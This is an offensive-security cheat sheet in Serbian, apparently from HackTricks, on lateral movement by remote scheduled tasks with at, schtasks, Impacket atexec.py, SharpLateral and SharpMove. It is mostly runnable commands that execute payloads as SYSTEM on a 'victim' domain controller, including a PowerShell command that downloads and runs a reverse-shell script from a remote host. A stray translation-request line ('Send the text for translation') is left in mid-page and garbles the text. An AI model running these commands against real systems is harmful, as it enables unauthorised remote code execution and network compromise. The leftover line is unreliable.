# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcioniše

Uz administratorski pristup Windows hostu, operater može daljinski da kreira i pokrene zakazani zadatak. Opcija `/S` bira udaljeni host, `/U` i `/P` po potrebi prosleđuju akreditive za kreiranje zadatka, a `/RU` bira nalog pod kojim se zadatak izvršava. Komanda navedena opcijom `/TR` mora da postoji na udaljenom sistemu.<sup>[[1]](#references)</sup>

Starija komanda `at` takođe može da zakaže izvršavanje komande na udaljenom hostu kada je servis Schedule pokrenut. Ona izvršava zakazane poslove pod servisnim nalogom, što je obično `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Kreirajte zadatak, a zatim ga pokrenite:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Pošaljite tekst za prevođenje.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Za zadatak koji se ponavlja svake nedelje, koristite važeći nedeljni raspored i eksplicitno navedite dan:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Akcija zadatka može takođe direktno pozvati PowerShell. Sledeći primer iz lab okruženja preuzima i pokreće skriptu; payload hostujte samo na infrastrukturi odobrenoj za procenu:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket-ov `atexec.py` automatizuje udaljeno izvršavanje komandi putem servisa Task Scheduler i prihvata autentifikaciju lozinkom, NTLM hash-om ili Kerberos-om.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral pruža metod izvršavanja zakazanih zadataka:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove pruža još jednu implementaciju Task Scheduler-a:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Više informacija o [**korišćenju schtasks sa silver tickets ovde**](../active-directory-methodology/silver-ticket.md#host).

Uklonite testne zadatke nakon upotrebe:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - kreiranje schtasks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - komanda `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
